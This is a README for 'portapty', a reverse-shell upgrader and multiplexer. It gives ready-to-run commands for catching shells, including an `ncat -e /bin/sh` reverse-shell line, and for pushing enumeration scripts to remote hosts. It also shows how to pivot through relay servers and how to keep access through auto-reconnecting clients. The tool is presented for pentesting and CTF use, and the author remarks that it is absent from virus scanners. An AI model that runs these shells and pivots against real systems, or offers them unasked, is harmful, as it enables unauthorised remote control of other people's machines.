# portapty

## What?
This is a portable pseudoterminal reverse shell upgrader and multiplexer
### What?
Portable: works on any linux version that can run this elf type (it's all statically linked and posix compliant)

Pseudoterminal: you can Control-C without killing the shell

Reverse shell: I haven't made it support bind shells yet

Upgrader: When a normal shell connects to it and doesn't try to TLS handshake with it,
it will be upgraded in a posix-compliant manner (this should even work on Linux from scratch boxes)

Multiplexer: multiple shells can connect at once

## Usage
```
portapty {client|server|keygen|relay|expose} OPTIONS
Options:
    client: [cert CERTHASH] to IP PORT [to IP PORT]...
    server: [cert CERTFILE] [key KEYFILE] [driver PATH] [cmd CMD] bind IP PORT [bind IP PORT]...;
    keygen: [cert CERTFILE] [key KEYFILE]
    relay:  bind IP PORT to IP PORT [bind|to IP PORT]...
    expose: [cert CERTFILE] [key KEYFILE] bind IP PORT to IP PORT [{bind|to} IP PORT]...
```
### Server
A simple invocation would be `portapty server eps :: 42069`. This hosts a server on port 42069 that will accept
both standard reverse shells on all IPv4 and v6 addresses (dual to IPv6 dual stacking).

On connection (like by `ncat -e /bin/sh :: 42069`), you will see messages like:
```
[portapty] SuperSecureServer ([::1]:57388) available on /dev/pts/63
```
If you run `screen /dev/pts/63` on this created pty, you will be able to interact with it fully, as if it were an ssh session.

If you had a script you wished to run on the remote, you could try the folowing:

```
portapty server driver 'cat >&2&cat /tmp/LinEnum.sh;echo sleep 1;echo exit;wait' cmd bash eps :: 42069
```

This is good demonstration of the features provided to drivers. Let's break down the shell command argument for driver:
* `cat >&2 &` will grab the output of the remote shell, and pass it to stderr, which is then printed to the server terminal, and then move to the background
* `cat /tmp/LinEnum.sh` will send the script `/tmp/LinEnum.sh` to the remote shell
* `echo sleep 1` sends the command `sleep 1` to the remote shell, giving us time to flush the output before disconnecting
* `echo exit` will tell the remote shell to close
* `wait` will wait for the cat command to finish, which will be when the remote closes
We also can elect to use `bash` rather than the standard shell with the system, which will make most scripts run better.

### Client
It is rather irregular to invoke the client directly, but if you are particularly worried about security, or are working with an arbitrary upload vulnerability, this could be helpful. 

For a simple connection WITHOUT verifying the server, you can use just `portapty client to :: 42069`, but for securing it, you can use:
```
portapty client cert iITKuu8FgIgarNJCo/4mG6mbN0I/p6kytpfTVvB+PCo= to :: 42069
```
This will check that the certificate SHA2-256 hash is `iITKuu8FgIgarNJCo/4mG6mbN0I/p6kytpfTVvB+PCo=`, and fail if it isn't.

### Keygen
If you have an unstable computer/connection, or are trying some HA system, you may wish to use the `keygen` option. An example is the following:

```
portapty keygen key portapty.key cert portapty.crt
```

This will print the fingerprint as well, so that you can prepare clients before starting the server

The server can be to to use the certificate and key like so:

```
portapty server key portapty.key cert portapty.crt
```
### Relay and expose
This is one of the cooler features of portapty. This acts as a simple TCP forwarder, and so allows pivoting with a central server:

```bash
# Main server
portapty server key portapty.key cert portapty.crt bind 10.0.0.1 42069
# Pivot server
portapty relay bind 192.168.0.1 42069 to 10.0.0.10 42069
# Target server
portapty client cert FinGeRpRInt= to 192.168.0.1 42069
```

Since the client is encrypted end-to-end, this unencrypted relay usage is secure. However, `relay` could also be used as a port forwarder, which would not have encryption. I'm not sure how to encrypt this well bidirectionally: feel free to submit a pull request!

### High availability
The release client has a `while(1)` loop to stop temporary disconnects from messing up your network, and paired with multiple endpoint specifications, this can be used to achieve a very resiliant network.

```
# Relay to the first accepting server
portapty relay bind :: 42069 to 10.0.0.1 42069 to 10.0.0.2 42069
# Connect to the first server that accepts us
portapty client to 10.0.0.1 42069 to 10.0.0.2 42069
# Tell upgraded clients to try multiple addresses (note the repeated ep in bind and advert)
portapty server bind 10.0.0.1 42069 advert 10.0.0.1 42069 advert 10.0.0.2 42069
```

## Disclaimer
Please don't do anything stupid with this (i.e. anything outside pentesting and ctfs). 
It isn't currently on any virus scanners, and I would prefer it to stay that way. 
It has a easy to detect signature, so it ain't stealthy.
